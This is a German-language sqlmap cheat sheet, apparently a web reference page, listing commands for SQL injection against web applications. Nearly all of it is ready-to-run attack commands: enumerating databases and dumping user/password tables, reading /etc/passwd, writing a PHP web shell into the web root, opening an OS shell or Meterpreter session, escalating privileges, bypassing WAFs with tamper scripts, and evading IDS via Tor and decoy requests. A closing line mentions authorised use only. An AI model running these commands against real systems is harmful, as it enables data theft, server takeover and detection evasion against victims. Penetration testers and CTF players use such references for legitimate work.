Grundlagen & Syntax
Ziel-URL (GET-Parameter)
sqlmap -u "http://target/page?id=1"
POST-Parameter
sqlmap -u "http://target/login" \ --data "user=a&pass=b"
Burp-Request-Datei einlesen
sqlmap -r request.txt
Spezifischen Parameter testen
sqlmap -u "http://target/page?id=1&cat=2" \ -p id
Cookie übergeben
sqlmap -u "http://target/page?id=1" \ --cookie "PHPSESSID=abc123"
Zufälliger User-Agent / via Tor
sqlmap -u "http://target/page?id=1" \ --random-agent sqlmap -u "http://target/page?id=1" \ --tor --tor-type=SOCKS5
Hinweis: --batch beantwortet alle interaktiven Fragen automatisch mit dem Default-Wert — ideal für Skripte und CTFs.
🗄️
Datenbank-Enumeration
Alle Datenbanken / aktuelle DB
sqlmap -u "URL?id=1" --dbs sqlmap -u "URL?id=1" --current-db
Aktueller Benutzer / DBA-Rechte
sqlmap -u "URL?id=1" --current-user sqlmap -u "URL?id=1" --is-dba
Tabellen einer Datenbank
sqlmap -u "URL?id=1" \ -D mydb --tables
Spalten einer Tabelle
sqlmap -u "URL?id=1" \ -D mydb -T users --columns
Daten extrahieren (Dump)
sqlmap -u "URL?id=1" \ -D mydb -T users \ -C username,password --dump
Alle Daten dumpen
sqlmap -u "URL?id=1" --dump-all \ --exclude-sysdbs # System-DBs überspringen
Vorsicht: --dump-all kann sehr große Datenmengen erzeugen. Mit --exclude-sysdbs werden System-Datenbanken (information_schema, mysql, …) übersprungen.

Injection-Techniken
Einzelne Technik wählen
# B = Boolean-based Blind sqlmap -u "URL?id=1" --technique=B # T = Time-based Blind sqlmap -u "URL?id=1" --technique=T # E = Error-based sqlmap -u "URL?id=1" --technique=E # U = UNION-based sqlmap -u "URL?id=1" --technique=U
Stacked Queries / Inline
# S = Stacked Queries sqlmap -u "URL?id=1" --technique=S # Q = Inline Queries sqlmap -u "URL?id=1" --technique=Q # Alle Techniken (Standard): sqlmap -u "URL?id=1" --technique=BEUSTQ
Time-based Verzögerung anpassen
sqlmap -u "URL?id=1" \ --technique=T --time-sec=5
Empfehlung: Standard-Reihenfolge ist BEUSTQ. Bei langsamen Verbindungen --technique=BEU verwenden, um Time-based-Tests zu überspringen.
🔑
Authentifizierung & Sessions
Session-Cookie / Custom Header
sqlmap -u "URL?id=1" \ --cookie "session=xyz; role=user" sqlmap -u "URL?id=1" \ --headers "X-Forwarded-For: 127.0.0.1"
HTTP-Basisauthentifizierung
sqlmap -u "URL?id=1" \ --auth-type=Basic \ --auth-cred=admin:password
CSRF-Token automatisch extrahieren
sqlmap -u "URL" \ --data "id=1" \ --csrf-token=csrf_token \ --csrf-url=http://target/login
Proxy (z. B. Burp Suite)
sqlmap -u "URL?id=1" \ --proxy=http://127.0.0.1:8080 sqlmap -u "URL?id=1" --ignore-proxy
Persistente Verbindung
sqlmap -u "URL?id=1" --keep-alive
Burp-Workflow: Request in Burp abfangen → in request.txt speichern → sqlmap -r request.txt — so werden alle Header und Cookies automatisch übernommen.
🖥️
Datei & OS-Zugriff
Datei vom Server lesen
sqlmap -u "URL?id=1" \ --file-read="/etc/passwd"
Datei auf Server schreiben
sqlmap -u "URL?id=1" \ --file-write=shell.php \ --file-dest="/var/www/html/shell.php"
OS-Befehl ausführen / OS-Shell
sqlmap -u "URL?id=1" \ --os-cmd="whoami" sqlmap -u "URL?id=1" --os-shell
Meterpreter via Metasploit
sqlmap -u "URL?id=1" --os-pwn sqlmap -u "URL?id=1" --priv-esc
Voraussetzung (MySQL): Der DB-Benutzer benötigt die FILE-Berechtigung für Dateioperationen. --is-dba prüft, ob DBA-Rechte vorhanden sind.
🛡️
WAF-Umgehung & Tamper
Einzelne Tamper-Scripts
# Leerzeichen → SQL-Kommentare: --tamper=space2comment # AND/OR → BETWEEN-Ausdruck: --tamper=between # Base64-Kodierung des Payloads: --tamper=base64encode # URL-Enkodierung aller Zeichen: --tamper=charencode # Zufällige Groß-/Kleinschreibung: --tamper=randomcase # Leerzeichen → +: --tamper=space2plus
Mehrere Tamper kombinieren
sqlmap -u "URL?id=1" \ --tamper=space2comment,randomcase
Maximale Aggressivität
sqlmap -u "URL?id=1" \ --level=5 --risk=3
Alle verfügbaren Tamper auflisten
sqlmap --list-tampers
level: 1–5 — Tiefe der Tests (höher = mehr Payloads). risk: 1–3 — Risiko-Level (3 kann Daten verändern). Standard: --level=1 --risk=1.
⚡
Performance & Stealth
Threads / Verzögerung / Timeout
# Parallele Threads (max. 10): sqlmap -u "URL?id=1" --threads=5 # Verzögerung zwischen Requests (Sek.): sqlmap -u "URL?id=1" --delay=1 # HTTP-Timeout in Sekunden: sqlmap -u "URL?id=1" --timeout=10 # Wiederholungen bei Verbindungsfehler: sqlmap -u "URL?id=1" --retries=3
Safe-URL für IDS-Vermeidung
sqlmap -u "URL?id=1" \ --safe-url="http://target/home" \ --safe-freq=5 # alle 5 Tests
Test-Tiefe und Risiko
# Schnell und sicher (Standard): sqlmap -u "URL?id=1" --level=1 --risk=1 # Ausgewogen: sqlmap -u "URL?id=1" --level=3 --risk=2
--safe-url sendet zwischen Injektions-Requests eine harmlose Anfrage an die angegebene URL — reduziert die Wahrscheinlichkeit einer Erkennung durch IDS/WAF.
📊
Output & Session
Verbosity-Level
# 0 = still, 1 = Standard, 2 = Info # 3 = Debug, 4 = Payloads, 5 = HTTP # 6 = HTTP-Response-Body sqlmap -u "URL?id=1" -v 3
Output-Verzeichnis
sqlmap -u "URL?id=1" \ --output-dir=/tmp/sqlmap_out
Session verwalten
# Session-Cache löschen: sqlmap -u "URL?id=1" --flush-session # Queries neu ausführen (kein Cache): sqlmap -u "URL?id=1" --fresh-queries # Spezifische Session-Datei nutzen: sqlmap -u "URL?id=1" -s session.sqlite
Optionen speichern & laden
sqlmap -u "URL?id=1" --dbs \ --save=mein_scan.ini sqlmap -C mein_scan.ini
Session-Wiederverwendung: sqlmap speichert Ergebnisse standardmäßig unter ~/.local/share/sqlmap/output/. Mit --flush-session wird der Cache des Ziels geleert.
🎯
Spezialziele
Formulare auto-erkennen / Crawl
# Alle Formulare der Seite testen: sqlmap -u "http://target/" --forms # Seite crawlen (Tiefe 3): sqlmap -u "http://target/" --crawl=3
Mehrere Ziele gleichzeitig
# Burp-Log-Datei scannen: sqlmap -l burp.log # Mehrere URLs aus Datei: sqlmap -m urls.txt
Second-Order SQLi
sqlmap -u "http://target/store" \ --data "name=test" \ --second-url="http://target/profile"
DBMS explizit angeben
# Beschleunigt den Scan erheblich: sqlmap -u "URL?id=1" --dbms=mysql sqlmap -u "URL?id=1" --dbms=mssql sqlmap -u "URL?id=1" --dbms=oracle sqlmap -u "URL?id=1" --dbms=postgresql
Second-Order SQLi: Der Payload wird bei -u eingeschleust, aber erst beim Abrufen von --second-url ausgeführt — typisch bei gespeicherten Inhalten wie Profilen oder Kommentaren.
📋
Quick Reference
Schneller Web-Scan
sqlmap -u "http://target/page?id=1" \ --dbs --batch --random-agent
POST-Formular mit Dump
sqlmap -u "http://target/search" \ --data "q=test" --dbs --batch
Burp-Request → Tabellen-Dump
sqlmap -r req.txt \ -D appdb -T users --dump
WAF-Bypass-Kombo
sqlmap -u "URL?id=1" \ --tamper=space2comment,randomcase \ --random-agent --level=3
OS-Shell via Stacked Queries
sqlmap -u "URL?id=1" \ --os-shell --technique=S \ --dbms=mysql
Empfohlene Basis-Flags: --batch --random-agent --level=2 für automatisierte Scans ohne manuelle Eingaben. Immer nur auf Systeme anwenden, für die eine ausdrückliche Genehmigung vorliegt.
